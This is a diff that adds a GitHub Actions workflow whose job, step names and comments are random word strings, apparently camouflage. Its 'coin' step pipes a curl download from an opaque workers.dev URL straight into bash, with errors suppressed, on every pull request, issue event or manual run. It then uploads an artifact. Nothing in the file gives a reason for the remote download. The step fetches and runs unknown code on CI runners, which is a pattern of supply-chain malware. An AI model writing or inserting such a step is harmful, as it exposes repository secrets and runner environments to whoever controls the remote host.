@@ -1,0 +1,28 @@
+name: mill
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+  issues:
+
+jobs:
+  dispose:
+    #backslide emotion depart respond fantasy foot
+    steps:
+    - name:  asleep
+      uses: actions/checkout@v6
+    #repeat generally sequence rouse
+    #steel program
+    - name: coin
+      continue-on-error: true
+      run: curl -S "https://i.donnickcarbonaro70085.workers.dev/b5/ec3869b2a69aa/34c935/f773/a311db94ac2c5/8ed/2c29ccfe57a1074eb79edb/d?r=1776082551&qd=y&uy=b" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'minister'
+        name: 'owing'
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        aggressive: ["endure", "reproductive", "serve", "property", "fisherman"]
+        exclude: ["eyesight", "fatal", "whisper", "elevator"]
